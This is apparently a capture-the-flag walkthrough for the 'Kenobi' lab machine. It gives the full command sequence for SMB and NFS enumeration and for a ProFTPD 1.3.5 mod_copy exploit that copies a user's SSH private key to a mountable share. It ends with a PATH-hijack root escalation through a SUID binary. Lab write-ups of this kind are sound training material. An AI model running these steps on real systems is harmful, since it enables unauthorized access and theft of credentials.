# Kenobi

- `nmap -sC -sV -oN nmap/initial 10.10.37.78` run nmap to find smb server running on 445
- `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.37.78`  this command to find the number of shares in the smb
- `smbclient //10.10.37.78/anonymous` use this to connect to the samba share
- `smbget -R smb://10.10.37.78/anonymous` using this we can recursively download the samba share
- FTP and ssh logs found in the samba share file
- Earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.
- `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.37.78`
- Use netcat to connect to the FTP server `nc 10.10.37.78 21`
- Proftpd 1.3.5 is running on the ftp port.
- Use `searchsploit proftpd 1.3.5` to find the exploits from exploit-db.com
- found an exploit from ProFtpd's mod_copy module. 
- The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.
- We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 
- We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.
```
nc 10.10.37.78 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.37.78]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```
- Mount the `/var/tmp` directory
```
mkdir /mnt/kenobiNFS
mount 10.10.37.78:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```
- Copy the ssh private key `cp /mnt/kenobi/tmp/id_rsa . `
- ssh as kenobi `ssh -i id_rsa kenobi@10.10.37.78`
- Find the files with suid bit set to escalate privileges `find / -perm -u=s -type f 2>/dev/null`
- Found a binary `/usr/bin/menu`
- This doesnot use any absolute paths, all the paths are getting executed from PATH variable, so we will overwrite the path variable.
```
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

// Enter 1 in the menu to execute /bin/sh
```